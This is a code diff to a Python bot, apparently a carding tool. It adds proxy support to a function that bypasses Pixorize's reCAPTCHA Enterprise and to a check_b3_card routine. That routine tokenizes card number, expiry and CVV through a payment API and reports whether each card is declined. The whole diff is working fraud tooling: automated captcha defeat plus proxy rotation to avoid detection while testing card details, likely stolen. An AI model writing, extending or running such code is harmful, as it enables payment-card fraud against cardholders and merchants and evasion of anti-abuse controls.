@@ -14,18 +14,22 @@ from BOT.tools.proxy import get_proxy
 user_locks = {}
 
 
-def recaptcha_bypass():
-    """Bypass reCAPTCHA for Pixorize - EXACT original code"""
+def recaptcha_bypass(proxy=None):
+    """Bypass reCAPTCHA for Pixorize with proxy support"""
     anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
     reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"    
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
     parsed_url = urlparse(anchor_url)
     params = parse_qs(parsed_url.query)
-    response = requests.get(anchor_url, headers=headers, timeout=30)
+    
+    # Setup proxy if provided
+    proxies = {'http': proxy, 'https': proxy} if proxy else None
+    
+    response = requests.get(anchor_url, headers=headers, proxies=proxies, timeout=30)
     token = re.search(r'value="([^"]+)"', response.text).group(1)
     data = {'v': params['v'][0],'reason': 'q','c': token,'k': params['k'][0],'co': params['co'][0],'hl': 'tr','size': 'invisible'}
     headers.update({"Referer": response.url,"Content-Type": "application/x-www-form-urlencoded"})
-    response = requests.post(reload_url, headers=headers, data=data, timeout=30)
+    response = requests.post(reload_url, headers=headers, data=data, proxies=proxies, timeout=30)
     return re.search(r'\["rresp","([^"]+)"', response.text).group(1)
 
 
@@ -140,17 +144,17 @@ def check_b3_card(cc, mm, yy, cvv, proxy=None):
             'accept-language': "en-US,en;q=0.9,ar;q=0.8"
         }
         
-        # IMPORTANT: Original uses requests.post directly, not the session!
-        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
+        # Fixed: Now uses session with proxy instead of direct requests.post
+        response = r.post(url, data=json.dumps(payload), headers=headers, timeout=30)
         
         try:
             token = response.json()["data"]["tokenizeCreditCard"]["token"]
         except:
             return "Declined ❌", "Tokenize Failed"
         
-        # Step 4: Get captcha
+        # Step 4: Get captcha with proxy support
         try:
-            captcha_token = recaptcha_bypass()
+            captcha_token = recaptcha_bypass(proxy)
         except:
             return "Declined ❌", "Captcha Failed"
         
